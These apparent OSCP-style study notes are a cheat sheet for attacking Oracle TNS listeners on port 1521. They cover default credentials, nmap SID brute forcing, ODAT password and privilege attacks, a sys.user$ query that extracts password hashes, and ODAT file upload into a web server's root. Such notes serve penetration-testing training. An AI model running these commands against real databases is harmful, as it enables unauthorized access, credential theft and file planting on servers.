# Oracle TNS Enumeration

## Overview

Oracle databases commonly expose the **TNS Listener** on TCP **1521**.

Misconfigurations may allow:
- SID brute forcing
- credential discovery
- privilege escalation
- file upload to webroot
- database enumeration
- password hash extraction

Oracle often appears in enterprise environments, especially legacy systems.

---

## Default Credentials

| Account | Default Password |
|--------|------------------|
| SYS | CHANGE_ON_INSTALL (Oracle 9) |
| DBSNMP | dbsnmp |

Oracle 10+ typically does not set a default SYS password.

---

## Oracle Components

| Component | Description |
|----------|-------------|
| TNS Listener | Handles client connection requests |
| SID | Database instance identifier |
| sqlplus | Oracle CLI client |
| ODAT | Oracle Database Attacking Tool |
| PL/SQL Exclusion List | Blocks execution of specified PL/SQL packages |

PL/SQL Exclusion List location:
```
$ORACLE_HOME/sqldeveloper
```

Acts as a blacklist restricting execution of specific PL/SQL packages.

---

## Default Port

| Port | Protocol | Service |
|------|----------|--------|
| 1521 | TCP | Oracle TNS Listener |

---

## Quick Workflow

1. Detect Oracle listener
2. Brute-force SID
3. Enumerate database with ODAT
4. Attempt authentication
5. Extract hashes / upload files

---

## Install Oracle Enumeration Tools

```bash
sudo apt-get install libaio1 python3-dev alien -y

git clone https://github.com/quentinhardy/odat.git
cd odat/

git submodule init
git submodule update

wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip

wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip

export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH

pip3 install cx_Oracle

sudo apt-get install python3-scapy -y

sudo pip3 install colorlog termcolor passlib python-libnmap

sudo apt-get install build-essential libgmp-dev -y

pip3 install pycryptodome
```

Verify installation:

```bash
./odat.py -h
```

---

## Nmap Enumeration

### Detect Oracle service

```bash
sudo nmap -p1521 -sV {IP} --open
```

---

### SID brute forcing

```bash
sudo nmap -p1521 -sV {IP} --open --script oracle-sid-brute
```

Identifies valid Oracle instance names.

---

## ODAT Enumeration

Oracle Database Attacking Tool (ODAT) can enumerate database components.

```bash
./odat.py all -s {IP}
```

Attempts:
- SID discovery
- user enumeration
- password attacks
- privilege escalation checks
- file access tests

---

## Connect with sqlplus

```bash
sqlplus {user}/{password}@{IP}/{SID}
```

Example:

```bash
sqlplus scott/tiger@10.10.10.10/XE
```

---

## Fix sqlplus Library Error

If encountering:

```
sqlplus: error while loading shared libraries: libsqlplus.so
```

Run:

```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"

sudo ldconfig
```

---

## Oracle Database Enumeration

List tables:

```sql
select table_name from all_tables;
```

Check privileges:

```sql
select * from user_role_privs;
```

Connect as sysdba:

```bash
sqlplus {user}/{password}@{IP}/{SID} as sysdba
```

---

## Extract Password Hashes

```sql
select name, password from sys.user$;
```

Hashes can be cracked offline.

---

## File Upload via ODAT

Create test file:

```bash
echo "Oracle File Upload Test" > testing.txt
```

Upload file:

```bash
./odat.py utlfile -s {IP} -d {SID} -U {user} -P {password} --sysdba --putFile {path} testing.txt ./testing.txt
```

Common webroot paths:

| OS | Path |
|----|------|
| Linux | /var/www/html |
| Windows | C:\inetpub\wwwroot |

Verify upload:

```bash
curl http://{IP}/testing.txt
```

---

## High Value Findings

Oracle enumeration may reveal:

- plaintext credentials
- password hashes
- privileged accounts
- database structure
- writable directories
- webroot access
- privilege escalation paths

---

## Cheatsheet

```bash
# detect oracle
sudo nmap -p1521 -sV {IP} --open

# brute force SID
sudo nmap -p1521 -sV {IP} --open --script oracle-sid-brute

# run ODAT
./odat.py all -s {IP}

# connect
sqlplus {user}/{password}@{IP}/{SID}

# connect as sysdba
sqlplus {user}/{password}@{IP}/{SID} as sysdba
```

```sql
select table_name from all_tables;

select * from user_role_privs;

select name, password from sys.user$;
```

```bash
# upload file
echo "test" > testing.txt

./odat.py utlfile -s {IP} -d {SID} -U {user} -P {password} --sysdba --putFile /var/www/html testing.txt ./testing.txt

curl http://{IP}/testing.txt
```

---

## Tags

#enumeration #oracle #tns #database #oscp #service-enum